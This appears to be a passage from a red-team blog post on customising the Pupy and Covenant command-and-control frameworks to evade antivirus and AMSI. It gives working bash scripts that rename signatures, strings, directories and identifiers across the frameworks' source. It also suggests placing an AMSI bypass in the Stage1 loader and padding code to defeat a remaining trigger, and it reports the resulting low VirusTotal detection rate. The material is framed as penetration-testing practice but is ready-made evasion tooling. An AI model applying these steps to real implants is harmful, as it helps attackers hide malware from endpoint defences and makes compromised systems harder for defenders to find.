Stage2 is neither x86 nor x64 depending on the victim system and contains the main agent code. Stage2 is over 9MB in size so i won´t show the code here but i can explain what pupy is doing.

Pupy is loading the C-Compiled Agent executable into memory via <a href="https://raw.githubusercontent.com/n1nj4sec/pupy/unstable/pupy/external/PowerSploit/CodeExecution/Invoke-ReflectivePEInjection.ps1">Invoke-ReflectivePEInjection.ps1</a>. If you read my previous blog posts you saw, that this script is flagged by AMSI. And exactly this script with its Triggers is the only detection technique for pupy Powershell payloads at the time of writing. So if you replace `Invoke-ReflectivePEInjection.ps1` with a custom modified version you won´t get any further AV-problems. I created one in my previous blog post <a href="https://s3cur3th1ssh1t.github.io/Bypass-AMSI-by-manual-modification-part-II/">Bypass AMSI by manual modification part II - Invoke-Mimikatz</a>, which is located <a href="https://gist.github.com/S3cur3Th1sSh1t/1bd87a34c2f84fe6695b89ad701f514f">in this gist</a>. I made it public two months ago, but there are new Triggers because it´s public:

<p align="center">
          <img src="/assets/posts/2020-11-14_C2_Customization/PE-Reflect.JPG">
</p>

Changing theese triggers results in other new Triggers. AMSITrigger recently got updated, so that you now can choose the chunk size and max signature size values via parameters. You can play a little bit with theese parameters to find all Triggers for manual modification:

<p align="center">
          <img src="/assets/posts/2020-11-14_C2_Customization/MoreTriggers.JPG">
</p>

Copy the resulting AMSI-Clean script into the corresponding pupy location and run the following command in the pupy main folder to evade detection:

```batch
find ./ -type f -print0 | xargs -0 sed -i "s/Invoke-ReflectivePEInjection/PE-Reflect/g"
find ./ -type f -print0 | xargs -0 sed -i "s/\$PEBytes/\$PupBytes/g"
find ./ -type f -print0 | xargs -0 sed -i "s/\$code/\$script/g"
find ./ -type f -print0 | xargs -0 sed -i "s/\$data/\$encrypted/g"
```

This should bypass most of the AV-Vendors at the time of writing without patching `Amsi.dll`.

The easier way of getting around AV here is just putting an AMSI-Bypass on the first line of the Stage1 script:

<p align="center">
          <img src="/assets/posts/2020-11-14_C2_Customization/AMSIStage1.JPG">
</p>

By doing this you just made pupy bypassing AMSI for every module, because everything is loaded in the same process, so that just one bypass for everything is enough.

## Covenant

Last but not least <a href="https://github.com/cobbr/Covenant">Covenant</a> is an very intuitive C2-Framework, easy to handle with the most important C2-Modules on board. I was using it for ~2 months now in the RTO-Lab, and i have mixed feelings for this C2-Framework. The benefits it serves are the following:

* As i said an intuitive and easy to handle GUI
* The modification for relevant code parts in the GUI, for Stagers and Executors as well as the option to easily integrate new Plugins helps in certain situations
* In memory execution of C# binaries and the Powerpick-technique for Powershell-script loading enables Covenant to use nearly all of the relevant open source Red-Team toolings

However i missed functional Port-Forwarding options as well as a socks-proxy module, which are needed in several pivoting situations. I also experienced crashes of the whole framework in certain situations, which sometimes could only be fixed by deleting the whole database file and restarting the framework. There are open issues for theese problems, so i hope they get fixed soon for a smooth operation.

Covenant has the option to generate several different stagers. If you already know Covenant and wonder about the name `Otto` instead of `Grunt` just read further.  

<p align="center">
          <img src="/assets/posts/2020-11-14_C2_Customization/Launchers.JPG">
</p>

The main stagers range from InstallUtil-Execution, over MSBuild and Powershell-Stagers up to <a href="https://github.com/TheWover/donut">donut</a> generated Shellcode or .NET binaries. For legacy Windows systems, <a href="https://github.com/tyranid/DotNetToJScript">DotNetToJScript</a> launchers can be used. 

The most relevant Code parts for all stagers can be found in the <a href="https://github.com/cobbr/Covenant/tree/master/Covenant/Data/Grunt/GruntHTTP">GruntHTTP template</a> as well as <a href="https://github.com/cobbr/Covenant/tree/master/Covenant/Data/Grunt/GruntSMB">GruntSMB template</a>. The code is modifiable and viewable via GUI.

Like i did in my previous blogposts, i chose the way of string replacement for AV-Evasion. To not break any functionality of submodules or embeded resources like DLL-files we first have to back them up:

```batch
#!/bin/sh
sudo git clone --recurse-submodules https://github.com/cobbr/Covenant /opt/Covenant

cd /opt/Covenant/Covenant/

mv ./Data/AssemblyReferences/ ../AssemblyReferences/
mv ./Data/ReferenceSourceLibraries/ ../ReferenceSourceLibraries/
mv ./Data/EmbeddedResources/ ../EmbeddedResources/
```

This time i thought about changing as much as possible which looks relevant for the framework to evade as many AV-Vendors as possible. The most obvious words used by Covenant in the codebase are `Grunt` and `Covenant`. Replacing them needs to change directory names as well as the content of files and can be done via the following bash script:

```batch
#!/bin/sh
mv ./Models/Covenant/ ./Models/EasyPeasy/
mv ./Components/CovenantUsers/ ./Components/EasyPeasyUsers/
mv ./Components/Grunts/ ./Components/Ottos/
mv ./Models/Grunts/ ./Models/Ottos/
mv ./Data/Grunt/GruntBridge/ ./Data/Grunt/OttoBridge/
mv ./Data/Grunt/GruntHTTP/ ./Data/Grunt/OttoHTTP/
mv ./Data/Grunt/GruntSMB/ ./Data/Grunt/OttoSMB/
mv ./Components/GruntTaskings/ ./Components/OttoTaskings/
mv ./Components/GruntTasks/ ./Components/OttoTasks/
mv ./Data/Grunt/ ./Data/Otto/

find ./ -type f -print0 | xargs -0 sed -i "s/Grunt/Otto/g"
find ./ -type f -print0 | xargs -0 sed -i "s/GRUNT/OTTO/g"
find ./ -type f -print0 | xargs -0 sed -i "s/grunt/otto/g"

find ./ -type f -print0 | xargs -0 sed -i "s/Covenant/EasyPeasy/g"
find ./ -type f -print0 | xargs -0 sed -i "s/COVENANT/EASYPEASY/g"

find ./ -type f -name "*Grunt*" | while read FILE ; do
	newfile="$(echo ${FILE} |sed -e "s/Grunt/Otto/g")";
	mv "${FILE}" "${newfile}";
done
find ./ -type f -name "*GRUNT*" | while read FILE ; do
	newfile="$(echo ${FILE} |sed -e "s/GRUNT/OTTO/g")";
	mv "${FILE}" "${newfile}";
done

find ./ -type f -name "*grunt*" | while read FILE ; do
	newfile="$(echo ${FILE} |sed -e "s/grunt/otto/g")";
	mv "${FILE}" "${newfile}";
done

find ./ -type f -name "*Covenant*" | while read FILE ; do
	newfile="$(echo ${FILE} |sed -e "s/Covenant/EasyPeasy/g")";
	mv "${FILE}" "${newfile}";
done

find ./ -type f -name "*COVENANT*" | while read FILE ; do
	newfile="$(echo ${FILE} |sed -e "s/COVENANT/EASYPEASY/g")";
	mv "${FILE}" "${newfile}";
done
``` 

By changing the word `Grunt`, several commands in Covenant will also be renamed. So you have to use `OttoWMI` in this case instead of `GruntWMI` for lateral movement.

Afterwards i took a look at the `GruntHTTP` as well as `GruntSMB` templates and also Decompiled Grunt executables via <a href="https://github.com/icsharpcode/ILSpy">IlSpy</a> to check for relevant words worth changing them. This was a time consuming process of trial and error because i often broke some functionality with replacements. It resulted in a list of words like for example:

```batch
Stage0Body
Stage1Body
Stage1Response
Stage2Bytes
ProfileHttp
ExecuteStager
```

Scanning the .NET binaries with <a href="https://github.com/matterpreter/DefenderCheck">DefenderCheck</a> revealed that the base64 encoded User-Agent, as well as the base64 encoded `Hello World` from the C2-Website source code and the URL to the C2-Server similar to the Empire Triggers were flagged. So it´s important, to generate a new profile before opening up a new listener:

<p align="center">
          <img src="/assets/posts/2020-11-14_C2_Customization/ProfileChange.JPG">
</p>

After changing all the profile informations, there was one more trigger:

<p align="center">
          <img src="/assets/posts/2020-11-14_C2_Customization/GUID.JPG">
</p>

The `GUID` - GrundUserID is used in .cs files, as well as .razor, .yaml and .json files of Covenant. To get around this trigger i therefore changed in in all corresponding files:

```batch
#!/bin/sh
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/GUID/ANOTHERID/g"
find ./ -type f -name "*.razor" -print0 | xargs -0 sed -i "s/GUID/ANOTHERID/g"
find ./ -type f -name "*.json" -print0 | xargs -0 sed -i "s/GUID/ANOTHERID/g"
find ./ -type f -name "*.yaml" -print0 | xargs -0 sed -i "s/GUID/ANOTHERID/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/guid/anotherid/g"
find ./ -type f -name "*.razor" -print0 | xargs -0 sed -i "s/guid/anotherid/g"
find ./ -type f -name "*.json" -print0 | xargs -0 sed -i "s/guid/anotherid/g"
find ./ -type f -name "*.yaml" -print0 | xargs -0 sed -i "s/guid/anotherid/g"
```
After changing all theese values, we have to get our resource files and submodules back. Afterwards we can build Covenant:

```batch
mv ../AssemblyReferences/ ./Data/ 
mv ../ReferenceSourceLibraries/ ./Data/ 
mv ../EmbeddedResources/ ./Data/ 

dotnet build
```
All this resulted in the following bash script, which automates the process of building a customized Covenant version:

<a href="https://gist.github.com/S3cur3Th1sSh1t/bf5935b5bff48f9f63bdbb4bcc9e8e3d">Covenant customize gist</a>

I was not able to change one more Trigger for the SMBGrunt via string replacement:

<p align="center">
          <img src="/assets/posts/2020-11-14_C2_Customization/SMBGrunt.JPG">
</p>

To get away of this i manually added some empty `Console.Writeline("");` statements in between the corresponding lines:

<p align="center">
          <img src="/assets/posts/2020-11-14_C2_Customization/OttoSMBBypass.JPG">
</p>

This is not an elegant solution but for the use-case of evasion it´s enough.

By the way the `OttoHTTP.exe` stager received 21/71 detections on Virustotal without any further obfuscation. I think that´s a pretty reliable result:

<p align="center">
          <img src="/assets/posts/2020-11-14_C2_Customization/OttoHTTP.JPG">
</p>

## Conclusion

In my first blog posts we saw how manual changes of Red-Team-/Penetrationtesting-tools can lead to AV-Evasion. This time, we found that the process of C2-Customization is nearly the same. 

For Empire, we need to change the bypasses and use custom listener options as well as optionally modify the script modules source code.

For Pupy, we `only` need to create a custom `Invoke-ReflectivePEInjection.ps1` and modify some python code or alternatively add one custom AMSI bypass.

For Covenant we also need to change the listener options and some parts of the Launcher templates source code for evasion, but its relatively easy to build a much more customized version with string replacements.

The more the code-base is changed, the more difficult is it for defenders to find compromised systems. A protection against malware by detection of the obvious strings does therefore not help, depending on the attacker. Side-effect: with string replacements you can also bypass in memory scans.

I think thats enough about AV-Evasion. Next blog posts will cover different topics.

## Links & Resources

* RedTeamOps Course - <a href="https://www.zeropointsecurity.co.uk/red-team-ops">https://www.zeropointsecurity.co.uk/red-team-ops</a>

* Covenant - <a href="https://github.com/cobbr/Covenant">https://github.com/cobbr/Covenant</a>

* Powershell Empire - <a href="https://github.com/BC-SECURITY/Empire">https://github.com/BC-SECURITY/Empire</a>

* Pupy - <a href="https://github.com/n1nj4sec/pupy">https://github.com/n1nj4sec/pupy</a>

* Starkiller - <a href="https://github.com/BC-SECURITY/Starkiller">https://github.com/BC-SECURITY/Starkiller</a>

* Powershell parameters - <a href="https://docs.microsoft.com/de-de/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1">https://docs.microsoft.com/de-de/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1</a>

* Bypass AMSI by manual modification - <a href="https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/">https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/</a> 

* AMSITrigger - <a href="https://github.com/RythmStick/AMSITrigger/tree/master/AMSITrigger">https://github.com/RythmStick/AMSITrigger/tree/master/AMSITrigger</a>

* CyberChef - <a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a>

* Amsi.fail - <a href="https://amsi.fail/">https://amsi.fail/</a>

* Invoke-Obfuscation - <a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a>

* LaZagne - <a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a>

* Pypykatz - <a href="https://github.com/skelsec/pypykatz">https://github.com/skelsec/pypykatz</a>

* AMSI bypass by manual modification part II - <a href="https://s3cur3th1ssh1t.github.io/Bypass-AMSI-by-manual-modification-part-II/">https://s3cur3th1ssh1t.github.io/Bypass-AMSI-by-manual-modification-part-II/</a>

* DotNet2Jscript - <a href="https://github.com/tyranid/DotNetToJScript">https://github.com/tyranid/DotNetToJScript</a>

* Ilspy - <a href="https://github.com/icsharpcode/ILSpy">https://github.com/icsharpcode/ILSpy</a>

* Defendercheck - <a href="https://github.com/matterpreter/DefenderCheck">https://github.com/matterpreter/DefenderCheck</a>
